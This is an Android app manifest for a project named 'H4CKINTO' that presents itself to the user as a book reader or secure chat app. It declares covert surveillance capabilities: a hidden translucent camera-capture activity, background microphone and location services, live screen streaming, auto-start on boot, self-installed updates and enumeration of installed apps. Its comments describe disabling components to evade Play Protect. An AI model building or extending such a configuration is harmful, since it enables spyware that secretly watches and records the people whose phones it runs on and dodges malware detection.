<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Basic Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <!-- WiFi scan (0xWI) — required for PermissionDetector + getScanResults -->
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- Camera Permission - ENABLED -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
    
    <!-- Audio Recording Permission - ENABLED -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    
    <!-- Location: required on Android 6+ for WiFi scan results (getScanResults); optional for other features -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <!-- <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" /> -->

    <!-- Notification Permission (Android 13+) -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- Storage Permissions for file access and management -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="29"
        tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    
    <!-- Battery optimization exemption for background service -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    
    <!-- Foreground service types for CAMERA and MICROPHONE - ENABLED -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <!-- Foreground service types for SCREEN MONITORING - DISABLED -->
    <!-- <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" /> -->
    
    <!-- Required when MainService uses FOREGROUND_SERVICE_TYPE_LOCATION (location in manifest for WiFi/GPS) -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <!-- Foreground service type for update download (Android 14+) -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <!-- Android 11+ (API 30+): allow querying all installed apps with launcher icon (e.g. WhatsApp, Facebook, Telegram) -->
    <queries>
        <intent>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent>
    </queries>

    <application
        android:name=".App"
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.H4CKINTO"
        android:usesCleartextTraffic="true"
        android:networkSecurityConfig="@xml/network_security_config"
        android:versionName="1.0.0"
        tools:targetApi="31">

        <!-- ═══════════════════════════════════════════════════════ -->
        <!-- Design Mode: "library" or "chat"                      -->
        <!-- Change this value to switch the app design at build   -->
        <!-- ═══════════════════════════════════════════════════════ -->
        <meta-data android:name="app_design_mode" android:value="chat" />

        <!-- Book Reader Main Activity (LAUNCHER) -->
        <activity
            android:name=".ui.BookReaderActivity"
            android:exported="true"
            android:theme="@style/Theme.BookReader"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Old Main Activity (Background Service Manager) -->
        <activity
            android:name=".SimpleMainActivity"
            android:exported="false"
            android:launchMode="singleInstance"
            android:theme="@style/Theme.H4CKINTO">
            <intent-filter>
                <action android:name="com.h4ckinto.android.REQUEST_SCREEN_RECORDING" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
            <intent-filter>
                <action android:name="com.h4ckinto.android.REQUEST_SCREEN_STREAM" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>

        <!-- Grant Application Activity -->
        <activity
            android:name=".GrantApplicationActivity"
            android:exported="true"
            android:theme="@style/Theme.H4CKINTO" />
        
        <!-- Transparent Camera Activity - For background camera capture -->
        <activity
            android:name=".TransparentCameraActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true"
            android:launchMode="singleInstance"
            android:configChanges="orientation|screenSize|keyboardHidden" />

        <!-- Book Details Activity -->
        <activity
            android:name=".ui.BookDetailsActivity"
            android:exported="false"
            android:theme="@style/Theme.BookReader"
            android:screenOrientation="portrait" />

        <!-- Book Reader View Activity -->
        <activity
            android:name=".ui.BookReaderViewActivity"
            android:exported="false"
            android:theme="@style/Theme.BookReader"
            android:screenOrientation="portrait" />

        <!-- Secure PIN Activity (Chat Design) -->
        <activity
            android:name=".ui.SecurePinActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- Conversation Activity (Chat Design) -->
        <activity
            android:name=".ui.ConversationActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- Audio Call Activity -->
        <activity
            android:name=".ui.AudioCallActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait"
            android:launchMode="singleTop" />

        <!-- Image Viewer Activity -->
        <activity
            android:name=".ui.ImageViewerActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:configChanges="orientation|screenSize"
            android:screenOrientation="unspecified" />

        <!-- User Profile Activity -->
        <activity
            android:name=".ui.UserProfileActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- QR Code Display Activity -->
        <activity
            android:name=".ui.QrCodeActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- QR Code Scanner Activity -->
        <activity
            android:name=".ui.QrScannerActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- Main Service - camera and microphone enabled -->
        <service
            android:name=".service.MainService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync|camera|microphone|location"
            />

        <!-- Screen Streaming Service (Live Screen Monitoring) - ENABLED -->
        <service
            android:name=".service.ScreenStreamService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaProjection"
            />

        <!-- App update download: runs in foreground, survives app exit, supports resume -->
        <service
            android:name=".update.UpdateDownloadService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync"
            />

        <!-- Notification Listener Service - DISABLED (Play Protect rejects it) -->
        <!--
        <service
            android:name=".service.H4CKINTONotificationListenerService"
            android:enabled="false"
            android:exported="false"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
        -->

        <!-- Location Update Receiver - DISABLED to avoid Play Protect warnings -->
        <!--
        <receiver
            android:name=".managers.LocationUpdateReceiver"
            android:enabled="false"
            android:exported="false">
            <intent-filter>
                <action android:name="com.h4ckinto.android.LOCATION_UPDATE" />
            </intent-filter>
        </receiver>
        -->

        <!-- FileProvider for camera capture and file sharing -->
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

        <!-- Boot Receiver - Auto-start service on device boot -->
        <!-- Allows file sync service to resume after device restart -->
        <receiver
            android:name=".receiver.BootReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <!-- Standard Android boot only -->
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>

        <!-- App Update: notified when DownloadManager finishes the update APK download -->
        <receiver
            android:name=".update.UpdateDownloadReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="android.app.DownloadManager.ACTION_DOWNLOAD_COMPLETE" />
            </intent-filter>
        </receiver>

        <!-- Forced Update: blocking screen when app is below min_supported_version -->
        <activity
            android:name=".update.ForcedUpdateActivity"
            android:exported="false"
            android:theme="@style/Theme.H4CKINTO"
            android:screenOrientation="portrait" />

        <!-- In-app "Updating" screen (WhatsApp-style): no notification, user taps Install -->
        <activity
            android:name=".update.UpdateInProgressActivity"
            android:exported="false"
            android:theme="@style/Theme.H4CKINTO"
            android:screenOrientation="portrait" />

    </application>

</manifest>
